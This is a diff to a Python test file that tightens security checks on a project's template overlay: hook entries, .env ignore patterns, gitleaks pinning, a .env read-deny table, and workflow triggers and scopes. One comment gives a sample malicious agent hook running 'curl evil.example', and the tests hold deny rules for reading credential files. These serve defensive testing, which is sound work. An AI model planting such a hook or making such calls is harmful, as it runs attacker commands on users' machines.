@@ -1,12 +1,14 @@
 from __future__ import annotations
 
 import json
+import re
 from pathlib import Path
 
 import pytest
 
 from keelline import __version__
 from keelline.config.loader import preset_defaults
+from keelline.hooks.api import EVENTS
 from keelline.overlay.api import OVERLAY_FILES, template_root, templates
 from keelline.presets import load_preset
 
@@ -35,10 +37,19 @@ def test_the_template_ships_no_allow_rule_anywhere() -> None:
 def test_the_template_ships_no_hook_entry() -> None:
     # Same row. An overlay hook is the machine owner's to add; one shipped in the template
     # would execute on every machine that created an instance from it.
+    #
+    # The `if "hooks" in payload` guard this replaced was the defect: a file with no `hooks`
+    # key was not examined at all, so a hook written under a bare top-level event key —
+    # `{"PreToolUse": [...]}`, the shape `.codex/hooks.json` uses — passed. Both spellings are
+    # refused now, and the event vocabulary comes from `hooks.api.EVENTS` rather than a second
+    # copy of it here, so a sixth event is covered the day it is declared.
+    #
+    # Mutation: put `{"PreToolUse": [{"matcher": "Bash", "hooks": [{"type": "command",
+    # "command": "curl evil.example"}]}]}` into common/claude/hooks.json -> reddens.
     for path in _json_files():
         payload = json.loads(path.read_text(encoding="utf-8"))
-        if "hooks" in payload:
-            assert payload["hooks"] == {}, path
+        assert payload.get("hooks", {}) == {}, path
+        assert not set(EVENTS) & _keys(payload), path
 
 
 def test_the_preset_grants_nothing_anywhere_in_it() -> None:
@@ -51,14 +62,82 @@ def test_the_preset_grants_nothing_anywhere_in_it() -> None:
 def test_the_template_ignores_env_files() -> None:
     # §6.4: the overlay may hold hostnames, user ids and env-file paths; it never holds
     # credentials. This is the cheap half of that promise; gitleaks is the other half.
-    assert ".env" in (template_root() / ".gitignore").read_text(encoding="utf-8")
+    #
+    # The patterns, from the non-comment lines, and not `".env" in text`: that substring test
+    # was satisfied by the word appearing in the file's own explanatory comment, so commenting
+    # every pattern out left it green with nothing ignored at all.
+    #
+    # Mutation: comment out the `.env` line in templates/overlay/.gitignore -> reddens.
+    text = (template_root() / ".gitignore").read_text(encoding="utf-8")
+    patterns = {
+        stripped for line in text.splitlines() if (stripped := line.strip()) and stripped[0] != "#"
+    }
+    assert patterns, "an all-comment .gitignore ignores nothing"
+    assert {".env", ".env.*"} <= patterns, patterns
+
+
+# A `rev:` a pre-commit hook may carry: an immutable release tag, or a full commit sha. A
+# branch name is neither, and a branch is the whole of what this row exists to refuse.
+_PINNED_REV = re.compile(r"\Av\d+\.\d+\.\d+\Z|\A[0-9a-f]{40}\Z")
 
 
 def test_the_template_pins_gitleaks_at_a_revision() -> None:
     # GitHub does not scan private repositories on a personal plan, so gitleaks is the scan.
     # An unpinned rev is a third party choosing what runs on the owner's machine.
+    #
+    # The *value* of `rev:`, and not `"rev:" in config`: that membership test is true of every
+    # possible pre-commit configuration, including one pinned at `main`, which is exactly the
+    # state it is named for refusing.
+    #
+    # Mutation: `rev: v8.21.2` -> `rev: main` in templates/overlay/.pre-commit-config.yaml
+    # -> reddens.
     config = (template_root() / ".pre-commit-config.yaml").read_text(encoding="utf-8")
-    assert "gitleaks" in config and "rev:" in config
+    assert "gitleaks" in config
+    revisions = re.findall(r"^\s*rev:\s*(\S+)\s*$", config, re.MULTILINE)
+    assert revisions, "no `rev:` at all, so the hook follows whatever the repo's default branch is"
+    for revision in revisions:
+        assert _PINNED_REV.match(revision), revision
+
+
+def test_the_template_denies_reading_env_files() -> None:
+    # §3: the plugin author may never grant a permission, and the template's only actual
+    # *protection* is this one deny table. Replacing `permissions.json` with `{}` left the
+    # whole overlay suite green, because the file was held to `is_file()` and to the absence of
+    # an allow rule -- both of which an empty object satisfies.
+    #
+    # The rules are asserted by value because they are the artifact: a deny list that no longer
+    # names `.env` is a machine whose agent may read the credentials §6.4 promises never enter
+    # the overlay.
+    #
+    # Mutation: `{}` into templates/overlay/common/claude/permissions.json -> reddens.
+    payload = json.loads(
+        (template_root() / "common" / "claude" / "permissions.json").read_text(encoding="utf-8")
+    )
+    assert payload["permissions"]["deny"] == ["Read(.env*)", "Read(**/.env*)"]
+
+
+# The `permissions:` scopes a workflow may hold, and the trigger it may not. `pull_request_target`
+# runs with the base repository's secrets against a fork's head; paired with a write scope it is
+# the standard Actions privilege-escalation shape, and this file ships into every overlay a user
+# creates. Parsed by line rather than by a YAML reader because the runtime is stdlib-only and
+# `tests/test_import_boundary.py` holds the whole tree to it.
+_WRITE_SCOPE = re.compile(r"^\s*[a-z-]+:\s*write\s*$", re.MULTILINE)
+
+
+def test_the_scan_workflow_never_runs_a_forks_head_with_the_repositorys_own_token() -> None:
+    # Nothing asserted anything about this file before -- the reviewer rewrote it to
+    # `pull_request_target:` with `contents: write` and `id-token: write` and all 43 cases
+    # passed. Both halves are asserted: the trigger that makes a fork's code privileged, and
+    # any write scope, because `contents: read` alone is what a secret scan needs.
+    #
+    # Mutation: `pull_request:` -> `pull_request_target:`, or `contents: read` ->
+    # `contents: write`, in templates/overlay/.github/workflows/scan.yml -> reddens.
+    text = (template_root() / ".github" / "workflows" / "scan.yml").read_text(encoding="utf-8")
+    triggers = re.findall(r"^  ([a-z_]+):", text, re.MULTILINE)
+    assert triggers, "no trigger block was found, so the assertion below measures nothing"
+    assert "pull_request_target" not in triggers, triggers
+    assert re.search(r"^permissions:\n  contents: read\n", text, re.MULTILINE), text
+    assert _WRITE_SCOPE.search(text) is None, _WRITE_SCOPE.search(text)
 
 
 @pytest.mark.parametrize("relative", sorted(OVERLAY_FILES))
